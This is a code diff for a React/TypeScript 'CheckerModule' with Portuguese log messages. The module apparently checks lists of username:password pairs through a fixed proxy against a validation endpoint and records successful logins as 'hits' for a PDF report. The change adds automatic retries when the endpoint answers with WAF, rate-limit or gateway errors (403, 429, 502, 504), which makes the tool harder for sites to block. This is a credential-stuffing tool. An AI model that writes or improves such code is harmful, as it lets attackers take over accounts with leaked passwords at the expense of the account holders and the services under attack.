@@ -64,29 +64,40 @@ export default function CheckerModule({ initialCredentials, onCredentialsChange 
       const [username, password] = credLines[i].split(':').map(s => s.trim());
       const currentProxy = FIXED_PROXY;
 
-      addLog('info', `Verificando: ${username}...`);
+      let retry = true;
+      while (retry && isRunningRef.current) {
+        addLog('info', `Verificando: ${username}...`);
 
-      try {
-        const res = await fetch('/api/validate', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password, proxy: currentProxy })
-        });
+        try {
+          const res = await fetch('/api/validate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password, proxy: currentProxy })
+          });
 
-        const result = await res.json();
+          if (res.status === 403 || res.status === 502 || res.status === 504 || res.status === 429) {
+            addLog('error', `[PROXY/WAF ERRO] Status ${res.status}. Tentando novamente: ${username}...`);
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            continue;
+          }
 
-        if (result.success) {
-          hitCount++;
-          setHitsList(prev => [...prev, { user: username, pass: password }]); // Store for PDF
-          addLog('hit', `[SUCESSO] ${username}:${password}`);
-        } else {
-          failCount++;
-          const msg = result.message || result.error || 'Falha Desconhecida';
-          addLog('fail', `[FALHA] ${username} - ${msg}`);
+          const result = await res.json();
+
+          if (result.success) {
+            hitCount++;
+            setHitsList(prev => [...prev, { user: username, pass: password }]); // Store for PDF
+            addLog('hit', `[SUCESSO] ${username}:${password}`);
+            retry = false;
+          } else {
+            failCount++;
+            const msg = result.message || result.error || 'Falha Desconhecida';
+            addLog('fail', `[FALHA] ${username} - ${msg}`);
+            retry = false;
+          }
+        } catch (err: any) {
+          addLog('error', `[ERRO DE CONEXÃO] ${username} - Problema. Retentando...`);
+          await new Promise(resolve => setTimeout(resolve, 2000));
         }
-      } catch (err: any) {
-        failCount++;
-        addLog('error', `[ERRO] ${username} - Problema na conexão`);
       }
 
       setProgress(prev => ({ ...prev, current: i + 1, hits: hitCount, fails: failCount }));
